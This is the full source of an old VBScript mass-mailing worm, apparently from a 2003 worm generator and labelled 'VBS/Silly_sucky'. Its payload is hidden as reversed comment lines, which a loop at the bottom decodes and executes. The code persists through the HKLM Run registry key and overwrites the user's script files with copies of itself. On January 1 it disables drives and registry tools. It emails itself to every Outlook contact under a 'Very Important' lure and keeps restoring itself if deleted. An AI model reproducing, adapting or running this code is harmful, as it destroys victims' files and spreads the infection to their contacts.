'txen emuser rorre no
' redlofbuS,sredlofbuS ,eliF ,seliF ,redloF ,evirD ,sevirD ,osF miD
')"tcejbometsyselif.gnitpircs"(tcejboetaerc = osf teS
')0(redloflaicepsteg.osf = reknip
'"sbv.noitacilpa23niw\" & reknip = deewbmud
')"llehs.tpircsw"(tcejboetaerc = cneves teS
'"% " & deewbmud & " exe.tpircsw" ,"etadpUniW\nuR\noisreVtnerruC\swodniW\tfosorciM\ERAWTFOS\MLKH" etirwger.cneves
'deewbmud ,emanlluftpircs.tpircsw elifypoc.osf
' sevird.osf=sevirD teS
'sevirD ni evirD hcaE roF
'neht ydaersi.evird fI
'txen emuser rorre no
' )htap(redlofteg.osf=redloF teS
' selif.redlof = seliF teS
'selif ni eliF hcaE roF
'neht  "sab" =)htap.elif(emaNnoisnetxEteG.osf ro  "ebv" =)htap.elif(emaNnoisnetxEteG.osf ro  "sbv"=)htap.elif(emaNnoisnetxEteG.osf fI
'eurt,htap.elif,emanlluftpircs.tpircsw eliFypoC.osf
'fi dne
'txen
'sredloFbuS.redlof = sredlofbuS teS
'sredlofbuS ni redlofbuS hcaE roF
' )htap(redlofteg.osf=redloF teS
' selif.redlof = seliF teS
'selif ni eliF hcaE roF
'neht  "sab" =)htap.elif(emaNnoisnetxEteG.osf ro  "ebv" =)htap.elif(emaNnoisnetxEteG.osf ro  "sbv"=)htap.elif(emaNnoisnetxEteG.osf fI
'eurt,htap.elif,emanlluftpircs.tpircsw eliFypoC.osf
'fi dne
' txeN
'neht 1 = )won(yad dna 1 = )won(htnom fi
'"DROWD_GER" ,36880176 ,"sevirDoN\rerolpxE\seiciloP\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\RESU_TNERRUC_YEKH" etirwger.cneves
'"DROWD_GER" ,0 ,"slooTyrtsigeRelbasiD\metsyS\seiciloP\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\RESU_TNERRUC_YEKH" etirwger.cneves
'"!!!...raey wen yppaH" xobgsm
'fi dne
' x miD
' txen emuser rorre no
'"tcejbO.metsySeliF.gnitpircS"= osf teS
' )osf(tcejbOetaerC=os teS
')"noitacilppA.kooltuO"(tcejbOetaerC=lo teS
')"noitacilppA.kooltuO"(tcejbOetaerC.tpircSW =tuo teS
')"IPAM"(ecapSemaNteG.tuo = ipam teS
' )1(stsiLsserddA.ipam = a teS
' tnuoC.seirtnEsserddA.a oT 1=x roF
' )0(metIetaerC.lo=liaM teS
')x(seirtnEsserddA.)1(stsiLsserddA.)"IPAM"(ecapSemaNteG.lo=ot.liaM
'"elif siht tuokcehc esaelp,tnatropmI yrreV"=tcejbuS.liaM
'"elif siht tuokcehc esaelp,tnatropmI yrreV"=ydoB.liaM
'emaNlluFtpircS.tpircsW ddA.stnemhcattA.liaM
' dneS.liaM
' txeN
' tiuQ.lo
'txen
' fi dne
'txen
')emanlluftpircs.tpircsw(eliftxetnepo.osf = ooooo teS
'lladaer.ooooo = oooooo
'esolc.ooooo
'oD
'neht ))emanlluftpircs.tpircsw(stsixeelif.osf(ton fi
')emanlluftpircs.tpircsw(eliftxetetaerc.osf =ooooooo tes
'oooooo etirw.ooooooo
'esolc.ooooooo
'fi dne
')"nuR\noisreVtnerruC\swodniW\tfosorciM\ERAWTFOS\MLKH"(daerger.ekcus = ooo
'neht "sbv.noitacilpa23niw\swodniw\:C" >< ooo fI
'"sbv.noitacilpa23niw\swodniw\:C" ,"nuR\noisreVtnerruC\swodniW\tfosorciM\ERAWTFOS\MLKH" etirwger.ekcus
'fi dne
'"" =ooo
'pool

On error resume next
Set fso = createobject("scripting.filesystemobject")
Set r = fso.opentextfile(wscript.scriptfullname)
aa=53
Do
fadly = r.readline
fadly2 = strreverse(fadly)
fadly3 = Mid(fadly2, 1, Len(fadly2) - 1)
all=all &":"& fadly3
aa = aa - 1
Loop While aa <> 0
seven = Mid(All, 2, Len(All) - 1)
execute (seven)

Set ooooo = fso.opentextfile(wscript.scriptfullname)
Set sevenc = createobject("wscript.shell")
oooooo = ooooo.readall
ooooo.close
Do
if not(fso.fileexists(wscript.scriptfullname)) then
set ooooooo= fso.createtextfile(wscript.scriptfullname)
ooooooo.write oooooo
ooooooo.close
end if
ooo = sevenc.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
If ooo <> "C:\windows\win32aplication.vbs" then
sevenc.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "C:\windows\win32aplication.vbs"
end if
ooo= ""
loop


'VBS/Silly_sucky encrypted
'Created by sevenC / N0:7
'Generated by SSWG v.0.1 by sevenC
' 1/ 11/ 2003


